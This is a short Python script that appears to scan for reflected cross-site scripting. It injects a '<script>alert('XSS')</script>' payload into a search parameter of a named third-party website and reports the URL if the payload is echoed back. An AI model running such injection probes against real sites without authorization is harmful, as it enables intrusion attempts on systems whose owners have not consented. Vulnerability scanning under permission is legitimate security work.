import requests
from bs4 import BeautifulSoup

def find_xss_vulnerabilities(url):
    payload = "<script>alert('XSS')</script>"
    vulnerable_urls = []

    # Inject the payload into the URL parameter
    test_url = url.replace("sajs", payload)
    response = requests.get(test_url)

    if payload in response.text:
        vulnerable_urls.append(test_url)

    return vulnerable_urls

# Example usage
url = "https://beyondordinary.in/Web/Search.php?Search=sajs"
vulnerabilities = find_xss_vulnerabilities(url)

for vuln in vulnerabilities:
    print(f"Potential XSS vulnerability found: {vuln}")
